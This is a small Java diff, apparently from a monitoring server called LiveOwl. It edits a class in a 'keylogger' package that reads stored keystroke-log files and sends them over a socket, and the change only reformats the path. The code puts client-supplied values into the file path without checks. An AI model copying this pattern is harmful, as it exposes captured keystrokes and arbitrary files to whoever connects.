@@ -1,14 +1,10 @@
-
 package com.server.liveowl.keylogger;
-
 import java.io.*;
 import java.net.Socket;
-
 import static com.server.liveowl.ServerConfig.KEYBOARD_PATH;
 
 public class ProcessSendFile implements Runnable {
 private final Socket clientSocket;
-
 public ProcessSendFile(Socket clientSocket) {
     this.clientSocket = clientSocket;
 }
@@ -19,7 +15,7 @@ public void run() {
          DataOutputStream dos = new DataOutputStream(clientSocket.getOutputStream())) {
         String clientId = dis.readUTF();
         String code = dis.readUTF();
-        String filePath = KEYBOARD_PATH + "/_" + code + "/keyboard_" + clientId + ".txt";
+        String filePath = KEYBOARD_PATH + "_" + code + "\\keyboard_" + clientId + ".txt";
         System.out.println("Đường dẫn file gửi: " + filePath);
         try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(filePath)))) {
             String line;
